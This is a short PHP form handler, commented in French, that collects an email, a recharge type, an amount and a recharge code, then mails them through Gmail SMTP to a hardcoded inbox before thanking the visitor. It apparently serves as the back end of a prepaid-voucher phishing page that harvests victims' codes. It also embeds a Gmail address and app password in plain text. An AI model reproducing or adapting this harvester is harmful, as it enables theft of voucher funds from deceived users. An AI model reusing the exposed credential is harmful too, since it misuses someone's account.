<?php
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;

// Inclure PHPMailer
require 'PHPMailer/src/Exception.php';
require 'PHPMailer/src/PHPMailer.php';
require 'PHPMailer/src/SMTP.php';

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    if (!empty($_POST['honeypot'])) {
        die("Spam détecté.");
    }

    $email = htmlspecialchars($_POST['email'] ?? '');
    $type_recharge = htmlspecialchars($_POST['type_recharge'] ?? '');
    $montant = htmlspecialchars($_POST['montant'] ?? '');
    $code_recharge = htmlspecialchars($_POST['code_recharge'] ?? '');

    $mail = new PHPMailer(true);

    try {
        // Configuration serveur SMTP
        $mail->isSMTP();
        $mail->Host = 'smtp.gmail.com';  // SMTP Gmail
        $mail->SMTPAuth = true;
        $mail->Username = 'alonmadonelod@gmail.com'; // Ton email Gmail
        $mail->Password = 'luas utjn pfyc ytbj'; // Mot de passe d'application Gmail
        $mail->SMTPSecure = 'tls';
        $mail->Port = 587;

        // Expéditeur / destinataire
        $mail->setFrom('alonmadonelod@gmail.com', 'Formulaire Recharge');
        $mail->addAddress('alonmadonelod@gmail.com'); // Toi-même ou une autre adresse

        // Contenu
        $mail->isHTML(false);
        $mail->Subject = 'Nouvelle recharge reçue';
        $mail->Body    = "E-MAIL : $email\nType : $type_recharge\nMontant : $montant\nCode : $code_recharge";

        $mail->send();
        header("Location: merci.html");
        exit;
    } catch (Exception $e) {
        echo "Erreur : le message n'a pas pu être envoyé. Mailer Error: {$mail->ErrorInfo}";
    }
}
?>
